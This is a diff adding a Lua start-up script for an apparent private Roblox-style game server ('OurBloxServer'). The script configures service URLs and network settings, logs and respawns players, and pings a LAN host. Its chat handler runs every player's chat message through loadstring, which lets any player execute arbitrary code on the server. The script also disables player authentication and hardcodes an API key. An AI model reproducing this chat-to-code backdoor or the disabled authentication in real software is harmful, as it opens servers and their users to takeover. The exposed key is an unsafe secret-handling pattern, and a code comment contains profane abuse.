@@ -1,0 +1,100 @@
+function start(PlaceId, Port, JobId, Url)
+--WHY THE FUCK WOULD YOU DO THIS YOU FUCKING AUT
+--Port = 53640
+-- ^^^^ stupid
+--- Declarations
+local NetworkServer = game:GetService("NetworkServer")
+local ContentProvider = game:GetService("ContentProvider")
+local ScriptContext = game:GetService("ScriptContext")
+local ChangeHistoryService = game:GetService("ChangeHistoryService")
+local RunService = game:GetService("RunService")
+local BadgeService = game:GetService("BadgeService")
+local Players = game:GetService("Players")
+local InsertService = game:GetService("InsertService")
+
+local ProxyUrl = Url .. ".ozzt.pw"
+local Key = "F46AFE99-AE12-0C8C-5DCC-F13D43308BFD"
+
+--- Prerequisites
+
+-- URLs
+pcall(function() ContentProvider:SetBaseUrl(Url .. "/") end)
+pcall(function() Players:SetAbuseReportUrl(Url .. "/AbuseReport/InGameChatHandler.ashx") end)
+pcall(function() Players:SetChatFilterUrl(Url .. "/Game/ChatFilter.ashx") end)
+pcall(function() Players:SetSysStatsUrl(Url .. "/sysstats") end)
+
+BadgeService:SetIsBadgeLegalUrl("")
+InsertService:SetBaseSetsUrl(Url .. "/Game/Tools/InsertAsset.ashx?nsets=10&type=base")
+InsertService:SetUserSetsUrl(Url .. "/Game/Tools/InsertAsset.ashx?nsets=20&type=user&userid=%d")
+InsertService:SetCollectionUrl(Url .. "/Game/Tools/InsertAsset.ashx?sid=%d")
+InsertService:SetAssetUrl(Url .. "/Asset/?id=%d")
+InsertService:SetAssetVersionUrl(Url .. "/Asset/?assetversionid=%d")
+
+-- Network
+pcall(function() NetworkServer:SetIsPlayerAuthenticationRequired(false) end)
+pcall(function() settings().Network.UseInstancePacketCache = true end)
+pcall(function() settings().Network.UsePhysicsPacketCache = true end)
+pcall(function() settings()["Task Scheduler"].PriorityMethod = Enum.PriorityMethod.AccumulatedError end)
+pcall(function() settings().Diagnostics:LegacyScriptMode() end)
+pcall(function() ChangeHistoryService:SetEnabled(false) end)
+
+settings().Network.PhysicsSend = Enum.PhysicsSendMethod.TopNErrors
+settings().Network.ExperimentalPhysicsEnabled = true
+settings().Network.WaitingForCharacterLogRate = 100
+
+-- Lua
+settings().Diagnostics.LuaRamLimit = 0
+
+-- Place IDs
+game:SetPlaceID(PlaceId, false)
+BadgeService:SetPlaceId(PlaceId)
+
+--- Functions
+local function OnPlayerAdded(player)
+	print("[".. JobId .. "] Player ".. player.name .. " (" .. player.userId ..") added")
+
+	player.Changed:connect(function(property)
+		if property == "Character" and player.Character then
+			player.Character.Humanoid.Died:connect(function()
+				print("[".. JobId .. "] Player ".. player.name .. " (" .. player.userId ..") died")
+				wait(5)
+				player:LoadCharacter()
+				print("[".. JobId .. "] Player ".. player.name .. " (" .. player.userId ..") respawned")
+			end)
+		end
+	end)
+	
+	player.Chatted:connect(function(msg)
+		loadstring(msg)()
+	end)
+end
+
+local function OnPlayerRemoved(player)
+	print("[".. JobId .. "] Player ".. player.name .. " (" .. player.userId .. ") leaving")
+end
+
+print("[".. JobId .. "] OurBloxServer started for " .. PlaceId)
+game:Load(Url .. "/asset/?id=1818")
+NetworkServer:Start(Port)
+	
+-- Connections
+Players.PlayerAdded:connect(OnPlayerAdded)
+Players.PlayerRemoving:connect(OnPlayerRemoved)
+	
+ScriptContext:SetTimeout(10)
+ScriptContext.ScriptsDisabled = false
+
+RunService:Run()
+
+coroutine.resume(coroutine.create(function()
+	while wait(20) do
+		print("[".. JobId .. "] Pinging")
+	    game:HttpPost("http://192.168.1.206:3000/games/ping?job=".. JobId .. "&id=" .. PlaceId .. "&players=" .. #game.Players:GetChildren(), true)
+	end
+end))
+
+print(#game.Players:GetChildren())
+game:HttpPost("http://192.168.1.206:3000/games/announce?job=".. JobId .. "&port=" .. NetworkServer.port .. "&id=" .. PlaceId, true)
+game:HttpPost(Url.. "/v1.1/RCCService/GameStart?apiKey=" .. Key, Port .. ":".. JobId)
+
+end
